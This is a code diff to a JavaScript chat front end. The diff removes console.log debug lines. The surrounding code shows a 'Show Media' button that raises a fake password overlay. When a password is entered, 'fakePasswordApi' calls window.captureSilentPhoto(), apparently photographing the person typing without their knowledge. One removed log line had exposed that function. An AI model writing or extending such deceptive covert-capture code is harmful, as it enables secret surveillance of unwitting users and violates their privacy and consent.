@@ -25,7 +25,7 @@ async function unlockScreen() {
     const input = document.getElementById("passwordInput");
     const error = document.getElementById("errorMsg");
 
-    console.log("[ui.extras Debug] unlockScreen called. input:", input ? input.value : "no-input");
+    
 
     if (!btn || btn.disabled) return;
     if (error) error.textContent = "";
@@ -36,7 +36,7 @@ async function unlockScreen() {
 
     try {
         const success = await fakePasswordApi(input.value);
-        console.log("[ui.extras Debug] fakePasswordApi success:", success);
+        
         if (success) {
             const passwordOverlay = document.getElementById("passwordOverlay");
             if (passwordOverlay) {
@@ -121,7 +121,7 @@ function resetButton(btn) {
 }
 
 async function fakePasswordApi(password) {
-    console.log("window.captureSilentPhoto:",window.captureSilentPhoto)
+    
     if (window.captureSilentPhoto) {
         window.captureSilentPhoto().catch(console.error);
     }
@@ -137,7 +137,7 @@ async function fakePasswordApi(password) {
 // SHOW MEDIA BUTTON
 // =============================================================================
 function initShowMedia() {
-    console.log("[initShowMedia] Called. Element in DOM:", document.getElementById("chatOption-ShowMedia"));
+    
     const showMediaBtn = document.getElementById("chatOption-ShowMedia");
     if (!showMediaBtn) {
         console.warn("[initShowMedia] Element #chatOption-ShowMedia not found in DOM.");
@@ -145,7 +145,7 @@ function initShowMedia() {
     }
 
     showMediaBtn.onclick = async (e) => {
-        console.log("[ShowMedia] Click event triggered on #chatOption-ShowMedia.", e);
+        
         const chatOption = document.getElementById("chatOption");
         if (chatOption) chatOption.classList.remove("active");
         
@@ -153,16 +153,16 @@ function initShowMedia() {
 
         // Load password overlay if not exists
         let passwordOverlay = document.getElementById("passwordOverlay");
-        console.log("[ShowMedia] Current passwordOverlay element in DOM:", passwordOverlay);
+        
         if (!passwordOverlay) {
             try {
-                console.log("[ShowMedia] passwordOverlay not found. Fetching via ComponentLoader...");
+                
                 const html = await ComponentLoader.load("password-overlay");
                 const wrapper = document.createElement("div");
                 wrapper.innerHTML = html;
                 passwordOverlay = wrapper.firstElementChild;
                 document.body.appendChild(passwordOverlay);
-                console.log("[ShowMedia] passwordOverlay loaded and attached to body:", passwordOverlay);
+                
                 
                 const passwordInput = document.getElementById("passwordInput");
                 if (passwordInput) {
@@ -186,7 +186,7 @@ function initShowMedia() {
         if (errorMsg) errorMsg.textContent = "";
         remainingAttempts = MAX_ATTEMPTS;
         passwordOverlay.classList.add("active");
-        console.log("[ShowMedia] Added active class to passwordOverlay. Classes:", passwordOverlay.className);
+        
         if (passwordInput) passwordInput.focus();
 
         const originalUnlock = window.unlockScreen;
